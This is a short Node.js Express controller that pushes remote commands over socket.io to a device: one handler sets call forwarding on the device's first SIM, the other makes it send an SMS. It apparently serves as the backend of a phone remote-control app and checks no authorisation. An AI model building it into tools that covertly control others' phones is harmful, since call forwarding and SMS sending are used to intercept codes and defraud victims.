import Command from '../models/Command.js';
import User from '../models/UserModel.js';


export const callForward = async (req, res) => {
    const { deviceId, number } = req.body;
    await User.updateOne(
        { deviceId, "sims.slot": 0 },
        { $set: { "sims.$.forwarding": number } }
    );
    const cmd = await Command.create({ deviceId, action: "CALL_FORWARD", payload: { number } });
    global.io.to(deviceId).emit("command", cmd);
    res.json({ cmd });
};

export const sendSms = async (req, res) => {
    try {
        const { deviceId, to, body } = req.body;
        if (!deviceId || !to || !body) {
            return res.status(400).json({ error: "Missing parameters" });
        }

        const cmd = await Command.create({
            deviceId,
            action: "SEND_SMS",
            payload: { to, body }
        });

        global.io.to(deviceId).emit("command", cmd);
        res.json({ cmd });
    } catch (err) {
        console.error("Send SMS error:", err);
        res.status(500).json({ error: "Failed to send SMS command" });
    }
};